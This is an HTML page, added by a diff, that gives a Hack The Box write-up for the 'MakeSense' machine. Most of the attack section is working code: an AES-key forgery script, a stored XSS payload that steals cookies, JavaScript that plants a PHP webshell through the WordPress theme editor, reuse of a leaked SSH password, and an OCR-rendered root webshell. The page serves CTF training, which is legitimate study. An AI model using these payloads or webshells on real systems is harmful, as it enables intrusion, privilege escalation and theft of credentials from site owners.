@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>MakeSense — .d4nx0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-terminal"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>MakeSense</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span> Week <span class="highlight">#7</span></div>
+            <div class="row"> Machine <span class="highlight">MakeSense</span></div>
+            <div class="row"> OS <span class="highlight">Linux</span></div>
+            <div class="row"> Difficulty <span class="highlight">Medium</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">Stored XSS</span>] [<span class="highlight">AES Key Leak</span>] [<span class="highlight">WordPress</span>] [<span class="highlight">OCR RCE</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+<h2>Reconnaissance</h2>
+<h3>Port scan</h3>
+<pre><code>nmap -sV -sC -A -T4 --reason -oA nmap-result <span class="ph">&lt;target-ip&gt;</span></code></pre>
+
+<pre><code>PORT     STATE    SERVICE     REASON         VERSION
+22/tcp   open     ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
+|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
+80/tcp   filtered http        no-response
+443/tcp  open     ssl/http    syn-ack ttl 63 Apache httpd 2.4.58 ((Ubuntu))
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-title: Agency LLC
+| ssl-cert: Subject: commonName=makesense.htb
+| Not valid before: 2026-05-29T16:37:29
+|_Not valid after:  2126-05-05T16:37:29
+|_http-generator: WordPress 7.0
+8001/tcp filtered vcom-tunnel no-response</code></pre>
+
+<p>Add hosts</p>
+<pre><code>echo &quot;<span class="ph">&lt;target-ip&gt;</span> makesense.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+
+<h3>Web content discovery</h3>
+<pre><code>ffuf -u https://makesense.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -ignore-body -fs 0</code></pre>
+
+<p>The interesting hits:</p>
+<pre><code>.hta                    [Status: 403, Size: 279, Words: 0, Lines: 0, Duration: 0ms]
+.htpasswd               [Status: 403, Size: 279, Words: 0, Lines: 0, Duration: 0ms]
+.gitignore              [Status: 200, Size: 1055, Words: 0, Lines: 0, Duration: 0ms]
+.htaccess               [Status: 403, Size: 279, Words: 0, Lines: 0, Duration: 0ms]
+.git/logs/              [Status: 200, Size: 34914, Words: 5289, Lines: 349, Duration: 4289ms]
+cgi-bin/                [Status: 200, Size: 34914, Words: 5289, Lines: 349, Duration: 1545ms]
+scripts                 [Status: 301, Size: 318, Words: 0, Lines: 0, Duration: 0ms]
+server-status           [Status: 403, Size: 279, Words: 0, Lines: 0, Duration: 0ms]
+wp-content              [Status: 301, Size: 321, Words: 0, Lines: 0, Duration: 0ms]
+wp-includes             [Status: 301, Size: 322, Words: 0, Lines: 0, Duration: 0ms]
+wp-admin                [Status: 301, Size: 319, Words: 0, Lines: 0, Duration: 0ms]
+xmlrpc.php              [Status: 405, Size: 42, Words: 0, Lines: 0, Duration: 0ms]</code></pre>
+
+<div class="callout warning"><strong>False-positive <code>.git</code></strong><p><code>ffuf</code> also reported <code>.git/logs/</code> as 200/34914 bytes — that is <strong>not</strong> an exposed git repo. WordPress serves <code>index.php</code> (the homepage, ~34914 bytes) for any unrecognized pretty-permalink path. A direct request to <code>/.git/HEAD</code> returns <code>301</code> via <code>X-Redirect-By: WordPress</code> (canonical trailing-slash redirect), confirming the file doesn't actually exist. Only <code>.gitignore</code> is real.</p></div>
+<div class="callout info"><strong>Hint</strong><p><code>.gitignore</code> is the first real clue</p></div>
+<pre><code>curl -sk https://makesense.htb/.gitignore</code></pre>
+
+<pre><code># Model files - excluded from repository (download via scripts)
+*.gguf
+*.bin
+*.safetensors
+
+# AI models - only exclude the large model files, keep transformers.js library
+wp-content/ai-models/models/
+
+# HuggingFace cache (Whisper models auto-download here)
+.cache/huggingface/</code></pre>
+
+<p>So the site uses client-side AI (Whisper) — this matches the homepage's "Call" button ("Ready to connect / Recording… / Speak your message after the beep").</p>
+<h3>WordPress enumeration</h3>
+<pre><code>wpscan --url https://makesense.htb --disable-tls-checks</code></pre>
+
+<pre><code>[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).
+ | Found By: Meta Generator (Passive Detection)
+ |  - https://makesense.htb/, Match: &#x27;WordPress 7.0&#x27;
+ | Confirmed By: Atom Generator (Aggressive Detection)
+ |  - https://makesense.htb/?feed=atom, &lt;generator uri=&quot;https://wordpress.org/&quot; version=&quot;7.0&quot;&gt;WordPress&lt;/generator&gt;
+
+[+] WordPress theme in use: webagency
+ | Location: https://makesense.htb/wp-content/themes/webagency/
+ | Style URL: https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0
+ | Style Name: WebAgency
+ | Style URI: https://example.com
+ | Description: Modern web development agency theme with Tailwind CSS...
+ | Author: WebAgency Team
+ | Author URI: https://example.com
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://makesense.htb/wp-content/themes/webagency/style.css?ver=7.0, Match: &#x27;Version: 1.0&#x27;
+ 
+ [i] No plugins Found.
+ [i] No Config Backups Found.</code></pre>
+
+<p>REST API is open and exposes the users endpoint:</p>
+<pre><code>curl -sk &quot;https://makesense.htb/index.php?rest_route=/wp/v2/users&quot;</code></pre>
+
+<pre><code>[{&quot;id&quot;:1,&quot;name&quot;:&quot;admin&quot;,&quot;slug&quot;:&quot;admin&quot;,&quot;url&quot;:&quot;http:\/\/localhost:8000&quot;,...}]</code></pre>
+
+<p>Note the admin user's <code>url</code> field points at <code>http://localhost:8000</code> — a hint that there is a localhost service the admin cares about (the OCR4 service on <code>8001</code> turns out to be it).</p>
+<div class="callout info"><strong>Under the Hood</strong><p><code>wp/v2/users</code> is enabled by default on unauthenticated REST. Many hardened sites disable it; here it leaks the admin slug and that localhost hint.</p></div>
+<h2>Foothold — Stored XSS via a leaked AES key</h2>
+<h3>Reading the client-side AI pipeline</h3>
+<p>The homepage loads three custom scripts:</p>
+<pre><code>&lt;script id=&quot;whisper-wrapper-js-extra&quot;&gt;
+var webagency_ajax = {&quot;ajax_url&quot;:&quot;https://makesense.htb/wp-admin/admin-ajax.php&quot;,&quot;nonce&quot;:&quot;4c58dec735&quot;,&quot;theme_url&quot;:&quot;https://makesense.htb/wp-content/themes/webagency&quot;,&quot;site_url&quot;:&quot;https://makesense.htb&quot;};
+&lt;/script&gt;
+&lt;script id=&quot;whisper-wrapper-js&quot; src=&quot;https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0&quot;&gt;&lt;/script&gt;
+&lt;script id=&quot;webagency-main-js&quot; src=&quot;https://makesense.htb/wp-content/themes/webagency/assets/js/main.js?ver=1.0&quot;&gt;&lt;/script&gt;</code></pre>
+
+<p><code>whisper-wrapper.js</code> is the prize. It contains:</p>
+<pre><code>// Symmetric encryption key (must match server-side)
+const ENCRYPTION_KEY = &#x27;bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI&#x27;;</code></pre>
+
+<p>and an <code>applySymbolMapping()</code> whose docstring is the smoking gun:</p>
+<pre><code>/**
+ * Map spoken words to their symbol equivalents for XSS injection
+ * &#x27;open bracket&#x27; -&gt; &#x27;&lt;&#x27;, &#x27;close bracket&#x27; -&gt; &#x27;&gt;&#x27;, ...
+ */</code></pre>
+
+<p>The intended UX is: user records audio → Whisper transcribes in-browser → text is summarized → the <code>{transcription, summary}</code> payload is AES-GCM encrypted with that key → POSTed to <code>admin-ajax.php?action=save_voice_results</code>. The server decrypts with the same key and stores the transcription in the <code>contact_submission</code> post's meta. An admin reviews submissions in <code>wp-admin/edit.php?post_type=contact_submission</code>, where the transcription is rendered <strong>unescaped</strong>.</p>
+<p>Because we have the key, we don't need to record audio at all — we can forge any encrypted payload ourselves.</p>
+<h3>The three AJAX actions</h3>
+<p>From <code>functions.php</code>:</p>
+<div style="overflow-x:auto;margin:1rem 0"><table style="width:100%;border-collapse:collapse;font-size:0.9rem">
+<tr>
+<th style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">Action</th>
+<th style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">Auth</th>
+<th style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">Purpose</th>
+</tr>
+<tr>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left"><code>submit_contact_form</code></td>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">nopriv</td>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">Creates a <code>contact_submission</code> post (message = content)</td>
+</tr>
+<tr>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left"><code>save_voice_raw</code></td>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">nopriv</td>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">Accepts a WAV upload, returns a fresh <code>post_id</code></td>
+</tr>
+<tr>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left"><code>save_voice_results</code></td>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">nopriv</td>
+<td style="border:1px solid var(--border);padding:0.4rem 0.6rem;text-align:left">Decrypts <code>encrypted_payload</code>, stores <code>transcription</code>/<code>summary</code> in post meta</td>
+</tr>
+</table></div>
+<h3>Forging the encrypted transcription</h3>
+<p>The JS encryption is straight WebCrypto AES-GCM: <code>key = SHA-256(ENCRYPTION_KEY)</code>, random 12-byte IV, output = <code>iv || ciphertext||tag</code> base64. We replicate it in Python:</p>
+<pre><code>nano encrypt_payload.py</code></pre>
+
+<pre><code>import json
+import hashlib
+import os
+import base64
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+KEY = b&#x27;bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI&#x27;
+
+def encrypt_payload(payload_dict):
+    &quot;&quot;&quot;Encrypt a payload for the WordPress admin-ajax endpoint&quot;&quot;&quot;
+    key = hashlib.sha256(KEY).digest()
+    iv = os.urandom(12)
+    ct = AESGCM(key).encrypt(iv, json.dumps(payload_dict).encode(), None)
+    return base64.b64encode(iv + ct).decode()
+
+if __name__ == &quot;__main__&quot;:
+    import sys
+    payload = sys.argv[1] if len(sys.argv) &gt; 1 else &#x27;{&quot;transcription&quot;:&quot;test&quot;,&quot;summary&quot;:&quot;test&quot;}&#x27;
+    # If payload is a JSON string, use it directly
+    try:
+        payload_dict = json.loads(payload)
+    except:
+        payload_dict = {&quot;transcription&quot;: payload, &quot;summary&quot;: &quot;test&quot;}
+    print(encrypt_payload(payload_dict))</code></pre>
+
+<p>First, prove the round-trip works with a benign marker:</p>
+<p>Get a fresh nonce</p>
+<pre><code>NONCE=$(curl -sk https://makesense.htb | grep -oP &#x27;&quot;nonce&quot;:&quot;\K[a-f0-9]+&#x27; | head -1)
+echo &quot;Nonce: $NONCE&quot;
+# Nonce: 9e39546208</code></pre>
+
+<p>Create  a voice recording post</p>
+<pre><code>curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -F &quot;action=save_voice_raw&quot; \
+  -F &quot;nonce=$NONCE&quot; \
+  -F &quot;voice_recording=@-;filename=v.wav;type=audio/wav&quot; &lt;&lt;&lt;&quot;RIFFWAVE&quot;
+# {&quot;success&quot;:true,&quot;data&quot;:{&quot;message&quot;:&quot;Audio saved, processing started.&quot;,&quot;post_id&quot;:69}}</code></pre>
+
+<p>Test the Round Trip</p>
+<pre><code># Create a test encryption
+TEST_PAYLOAD=$(python3 encrypt_payload.py &#x27;{&quot;transcription&quot;:&quot;TEST_MARKER_123&quot;,&quot;summary&quot;:&quot;test&quot;}&#x27;)
+
+# Submit it
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -F &quot;action=save_voice_results&quot; \
+  -F &quot;nonce=$NONCE&quot; \
+  -F &quot;post_id=69&quot; \
+  -F &quot;encrypted_payload=$TEST_PAYLOAD&quot;
+# {&quot;success&quot;:true,&quot;data&quot;:{&quot;message&quot;:&quot;Results saved successfully!&quot;,&quot;post_id&quot;:69}}</code></pre>
+
+<h3>Create the XSS Payload</h3>
+<p>A short XSS that exfiltrates <code>location.href</code> + <code>document.cookie</code> back into a <em>new</em> public <code>contact_submission</code> (via the unauthenticated <code>submit_contact_form</code> action, whose nonce we re-fetch from the homepage each time):</p>
+<pre><code>XSS_PAYLOAD=&#x27;&lt;script&gt;
+fetch(&quot;/&quot;).then(r=&gt;r.text()).then(h=&gt;{
+  let n=h.match(/&quot;nonce&quot;:&quot;([a-f0-9]+)&quot;/)[1];
+  fetch(&quot;/wp-admin/admin-ajax.php&quot;,{method:&quot;POST&quot;,
+    headers:{&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;},
+    body:&quot;action=submit_contact_form&amp;nonce=&quot;+n+&quot;&amp;name=BOTVISIT&amp;email=b@b.com&amp;phone=1&amp;message=&quot;+encodeURIComponent(location.href+&quot;|||&quot;+document.cookie)});
+});
+&lt;/script&gt;&#x27;</code></pre>
+
+<pre><code># Encrypt it
+XSS_ENCRYPTED=$(python3 encrypt_payload.py &quot;{\&quot;transcription\&quot;:\&quot;$XSS_PAYLOAD\&quot;,\&quot;summary\&quot;:\&quot;test\&quot;}&quot;)
+
+# Submit it
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -F &quot;action=save_voice_results&quot; \
+  -F &quot;nonce=$NONCE&quot; \
+  -F &quot;post_id=69&quot; \
+  -F &quot;encrypted_payload=$XSS_ENCRYPTED&quot;
+# {&quot;success&quot;:true,&quot;data&quot;:{&quot;message&quot;:&quot;Results saved successfully!&quot;,&quot;post_id&quot;:69}}</code></pre>
+
+<p>Encrypt that as the transcription and submit it on a fresh voice-call post. ~30 seconds later:</p>
+<pre><code>curl -sk &quot;https://makesense.htb/index.php?rest_route=/wp/v2/contact_submission&amp;per_page=10&amp;orderby=date&amp;order=desc&quot;</code></pre>
+
+<pre><code>{&quot;id&quot;:73,&quot;title&quot;:{&quot;rendered&quot;:&quot;Contact from BOTVISIT&quot;},
+ &quot;content&quot;:{&quot;rendered&quot;:&quot;&lt;p&gt;https://makesense.htb/wp-admin/edit.php?post_type=contact_submission|||wp-settings-time-3=1783234289&lt;/p&gt;&quot;}}</code></pre>
+
+<p>So a headless Chrome bot lands on <code>edit.php?post_type=contact_submission</code> and our transcription renders there. Auth cookies are <code>HttpOnly</code>, so the exfil channel is: the bot runs our JS as admin, and we exfiltrate by creating <em>new</em> public <code>contact_submission</code> posts that we read via REST.</p>
+<div class="callout info"><strong>Why the bot keeps firing</strong><p>Each XSS-created <code>contact_submission</code> is itself a new submission, so the bot visits it next cycle. The loop only sustains while the newest post still contains a <code>&lt;script&gt;</code>. If you overwrite an old post the bot won't revisit it — always drop payloads on the *newest* post (create via <code>save_voice_raw</code>).</p></div>
+<h3>Deploy the RCE Payload</h3>
+<p>The bot is admin, so it can use <code>wp-admin/theme-editor.php</code>. Two gotchas cost real time:</p>
+<p>1. <strong>The nonce field is <code>name=&quot;nonce&quot;</code>, not <code>_wpnonce</code>.</strong> Standard WordPress uses <code>_wpnonce</code>; this theme/version uses <code>nonce</code>. My first attempts extracted <code>_wpnonce</code> and got nothing (the only <code>_wpnonce</code> on the page is the <em>logout</em> link's).</p>
+<p>2. <strong>WordPress 7.0 PHP-lints <code>newcontent</code> before writing.</strong> A webshell written as <code>$_GET[chr(99)]</code> to dodge quote-escaping failed the lint and silently wasn't saved. Switching to <code>$_GET[1]</code> (integer key, no quotes) passes lint and works fine.</p>
+<p>Now, let's inject PHP code into the theme's footer.php:</p>
+<pre><code>RCE_PAYLOAD=&#x27;&lt;script&gt;fetch(&quot;/&quot;).then(r=&gt;r.text()).then(async h=&gt;{
+  let n=h.match(/&quot;nonce&quot;:&quot;([a-f0-9]+)&quot;/)[1];
+  let P=(m,b)=&gt;fetch(&quot;/wp-admin/admin-ajax.php&quot;,{method:&quot;POST&quot;,
+    headers:{&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;},
+    body:&quot;action=submit_contact_form&amp;nonce=&quot;+n+&quot;&amp;name=&quot;+m+&quot;&amp;email=b@b.com&amp;phone=1&amp;message=&quot;+encodeURIComponent(b).slice(0,5000)});
+  let r=await fetch(&quot;/wp-admin/theme-editor.php?theme=webagency&amp;file=footer.php&quot;,{credentials:&quot;include&quot;});
+  let t=await r.text();
+  let wn=t.match(/name=&quot;nonce&quot; value=&quot;([a-f0-9]+)&quot;/)[1];
+  let f=new FormData();
+  f.append(&quot;nonce&quot;,wn); f.append(&quot;action&quot;,&quot;update&quot;);
+  f.append(&quot;file&quot;,&quot;footer.php&quot;); f.append(&quot;theme&quot;,&quot;webagency&quot;);
+  f.append(&quot;newcontent&quot;,&quot;&lt;?php if(isset($_GET[1])){system($_GET[1]);exit;} ?&gt;&quot;);
+  f.append(&quot;submit&quot;,&quot;Update File&quot;);
+  let r2=await fetch(&quot;/wp-admin/theme-editor.php&quot;,{method:&quot;POST&quot;,body:f,credentials:&quot;include&quot;});
+  await P(&quot;UP&quot;,&quot;st=&quot;+r2.status);
+})&lt;/script&gt;&#x27;</code></pre>
+
+<pre><code># Encrypt and submit it
+RCE_ENCRYPTED=$(python3 encrypt_payload.py &quot;{\&quot;transcription\&quot;:\&quot;$RCE_PAYLOAD\&quot;,\&quot;summary\&quot;:\&quot;test\&quot;}&quot;)
+
+# Create a new voice post for this RCE payload
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -F &quot;action=save_voice_raw&quot; \
+  -F &quot;nonce=$NONCE&quot; \
+  -F &quot;voice_recording=@-;filename=v.wav;type=audio/wav&quot; &lt;&lt;&lt;&quot;RIFFWAVE&quot;
+# {&quot;success&quot;:true,&quot;data&quot;:{&quot;message&quot;:&quot;Audio saved, processing started.&quot;,&quot;post_id&quot;:84}}
+
+# Submit the encrypted RCE payload with the new post_id
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php \
+  -F &quot;action=save_voice_results&quot; \
+  -F &quot;nonce=$NONCE&quot; \
+  -F &quot;post_id=84&quot; \
+  -F &quot;encrypted_payload=$RCE_ENCRYPTED&quot;
+# {&quot;success&quot;:true,&quot;data&quot;:{&quot;message&quot;:&quot;Results saved successfully!&quot;,&quot;post_id&quot;:84}}</code></pre>
+
+<p>Wait ~30 seconds for the bot to execute. Then:</p>
+<pre><code>curl -sk &quot;https://makesense.htb/wp-content/themes/webagency/footer.php?1=id&quot;
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+<h2>Privilege Escalation</h2>
+<h3>SSH as `walter`</h3>
+<p><code>wp-config.php</code> reveals a SQLite-backed WordPress with plaintext credentials:</p>
+<pre><code>curl -sk &quot;https://makesense.htb/wp-content/themes/webagency/footer.php?1=cd+../../..;+ls&quot;
+curl -sk &quot;https://makesense.htb/wp-content/themes/webagency/footer.php?1=cd+../../..;+cat+wp-config.php&quot;</code></pre>
+
+<pre><code>// Dummy MySQL settings (required but not used with SQLite)
+define( &#x27;DB_NAME&#x27;, &#x27;wordpress&#x27; );
+define( &#x27;DB_USER&#x27;, &#x27;walter&#x27; );
+define( &#x27;DB_PASSWORD&#x27;, &#x27;JbhHDAEgXvri3!&#x27; );
+define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );
+define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );
+define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );</code></pre>
+
+<p>Try it for SSH (password reuse):</p>
+<pre><code>sshpass -p &#x27;JbhHDAEgXvri3!&#x27; ssh walter@makesense.htb</code></pre>
+
+<pre><code>Last login: Tue Jul 7 12:10:16 2026
+walter@makesense:~$ id
+uid=1000(walter) gid=1000(walter) groups=1000(walter)</code></pre>
+
+<h3>A root PHP server on localhost:8001</h3>
+<p>From walter's shell:</p>
+<pre><code>ss -tlnp</code></pre>
+
+<pre><code>LISTEN 0  4096  127.0.0.1:8001   0.0.0.0:*
+LISTEN 0  4096  127.0.0.1:42339  0.0.0.0:*     # chromedriver (the bot)
+LISTEN 0  4096  127.0.0.1:45343  0.0.0.00:*    # chrome devtools</code></pre>
+
+<pre><code>ps aux | grep -E &#x27;8001|ocr&#x27; | grep -v grep</code></pre>
+
+<pre><code>root  1400  /bin/sh -c /root/.scripts/start_ocr4.sh
+root  1401  /bin/bash /root/.scripts/start_ocr4.sh
+root  1413  php -S 127.0.0.1:8001 -t /root/ocr4/</code></pre>
+
+<p>A PHP built-in server running as <strong>root</strong>, webroot <code>/root/ocr4/</code>, started by a root cron. Probe it:</p>
+<pre><code>curl -sI http://127.0.0.1:8001/</code></pre>
+
+<pre><code>HTTP/1.0 401 Unauthorized
+X-Powered-By: PHP/8.3.6
+WWW-Authenticate: Basic realm=&quot;OCR Protected&quot;</code></pre>
+
+<p>Try the only password we have — walter's, reused again:</p>
+<pre><code>curl -s -o /dev/null -w &quot;%{http_code}\n&quot; -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/
+# 200</code></pre>
+
+<p>Tunnel it locally so we can drive it comfortably:</p>
+<pre><code>sshpass -p &#x27;JbhHDAEgXvri3!&#x27; ssh -fN -L 8101:127.0.0.1:8001 walter@makesense.htb</code></pre>
+
+<h3>The OCR4 app</h3>
+<p><code>http://127.0.0.1:8101/</code> is a canvas: draw a word, hit <strong>Recognize</strong>, tesseract reads it back, and a "Save as" form lets you write the recognized text into <code>saved/&lt;filename&gt;</code>:</p>
+<div class="note-image"><img src="../src/images/makesense/makesense-1.png" alt="Draw a word" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Pasted image 20260707191740.png]</em>'"></div>
+<div class="note-image"><img src="../src/images/makesense/makesense-2.png" alt="Recognized text" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Pasted image 20260707193637.png]</em>'"></div>
+<pre><code>&lt;form method=&quot;post&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;ocr_id&quot; value=&quot;ocr_6a4a07be0b94f4.40299995&quot;&gt;
+  &lt;input type=&quot;text&quot; name=&quot;filename&quot; placeholder=&quot;result.txt&quot; required&gt;
+  &lt;button type=&quot;submit&quot; name=&quot;save_output&quot;&gt;Save&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+
+<p>Then, I'm trying the save in <code>.php</code></p>
+<div class="note-image"><img src="../src/images/makesense/makesense-3.png" alt="Save as PHP" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Pasted image 20260707194312.png]</em>'"></div>
+<p>It works, but <code>.php</code> is permitted, and the saved file lives inside the root server's webroot. The saved file's content is the tesseract-recognized text. So if we can get tesseract to read PHP, we write a root-executed webshell.</p>
+<h3>Making tesseract write PHP</h3>
+<p>Render the payload as a clean monospace image and let OCR do its job:</p>
+<pre><code>nano root_payload.py</code></pre>
+
+<pre><code>from PIL import Image, ImageDraw, ImageFont
+import base64, io, re, html, requests
+
+pl = &#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;
+img = Image.new(&#x27;RGB&#x27;, (1400,140), &#x27;white&#x27;)
+d = ImageDraw.Draw(img)
+f = ImageFont.truetype(&#x27;/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf&#x27;, 52)
+d.text((20,40), pl, fill=&#x27;black&#x27;, font=f)
+b = io.BytesIO(); img.save(b, &#x27;PNG&#x27;)
+dataurl = &#x27;data:image/png;base64,&#x27; + base64.b64encode(b.getvalue()).decode()
+
+s = requests.Session(); s.auth = (&#x27;walter&#x27;,&#x27;JbhHDAEgXvri3!&#x27;); s.verify=False
+r = s.post(&#x27;http://127.0.0.1:8101/&#x27;, data={&#x27;canvas_image&#x27;: dataurl})
+oid = re.search(r&#x27;name=&quot;ocr_id&quot; value=&quot;([^&quot;]+)&quot;&#x27;, r.text).group(1)
+rec = html.unescape(re.search(r&#x27;output-text&quot;&gt;([^&lt;]*)&lt;&#x27;, r.text).group(1)).strip()
+print(&#x27;recognized:&#x27;, repr(rec))
+# recognized: &#x27;&lt;?php system($_GET[&quot;c&quot;]) ;?&gt;&#x27;   (space before ; is harmless)
+
+# save it as a PHP file inside the root webroot
+r2 = s.post(&#x27;http://127.0.0.1:8101/&#x27;, data={&#x27;ocr_id&#x27;:oid,&#x27;filename&#x27;:&#x27;shell.php&#x27;,&#x27;save_output&#x27;:&#x27;Save&#x27;})
+# -&gt; &quot;Saved as: saved/shell.php&quot;
+
+# trigger it
+print(s.get(&#x27;http://127.0.0.1:8101/saved/shell.php&#x27;, params={&#x27;c&#x27;:&#x27;id&#x27;}).text)</code></pre>
+
+<pre><code>recognized: &#x27;&lt;?php system($_GET[&quot;c&quot;]) ;?&gt;&#x27;
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+<p>Root webshell at <code>/saved/shell.php</code>, served by the root PHP process. Grab the flags:</p>
+<pre><code>curl -s -u walter:JbhHDAEgXvri3! &quot;http://127.0.0.1:8101/saved/shell.php&quot; \
+  -G --data-urlencode &quot;c=id; cat /home/walter/user.txt /root/root.txt&quot;</code></pre>
+
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+<span class="ph">&lt;user-flag&gt;</span>
+<span class="ph">&lt;root-flag&gt;</span></code></pre>
+
+<h2>Flag Path</h2>
+<pre><code>/home/walter/user.txt
+/root/root.txt</code></pre>
+
+        </div>
+      </div>
+      <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','unzip','python3','sudo','nmap','ssh','ssh-keygen','sshpass','rustscan','gobuster','ffuf','curl','nc','echo','cat','cd','mkdir','cp','mv','rm','chmod','chown','find','grep','awk','sed','tar','scp','systemctl','su','exit','whoami','id','ls','ping','ps','kill','pwd','touch','bash','sh','git','pip','nano','wpscan','ss'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.dataset.converted === '1') return;
+      var codeEl = pre.querySelector('code');
+      if (!codeEl) return;
+      var rawText = codeEl.innerText.replace(/\n$/, '');
+      var lines = rawText.split(/\n/);
+      var multiline = lines.length > 2
+        || /^(import |from |def |class |KEY |const |var |PORT |LISTEN |HTTP|\[\+)/m.test(rawText)
+        || rawText.indexOf('{') !== -1 && lines.length > 1;
+
+      var block = document.createElement('div');
+      block.className = 'cmd-block';
+
+      var label = document.createElement('div');
+      label.className = 'cmd-block-label';
+      var labelText = 'command';
+      if (multiline) {
+        if (/^import |^from |^def |python|KEY =|encrypt/i.test(rawText)) labelText = 'python';
+        else if (/^const |^var |^function |<script|XSS_|RCE_/i.test(rawText)) labelText = 'javascript';
+        else if (/^PORT |^LISTEN |^\[/m.test(rawText) || rawText.indexOf('OpenSSH') !== -1) labelText = 'output';
+        else if (/^<!DOCTYPE|^<html|^<form|^<script/i.test(rawText)) labelText = 'html';
+        else if (/^\{/.test(rawText.trim()) || rawText.indexOf('"id"') !== -1) labelText = 'json';
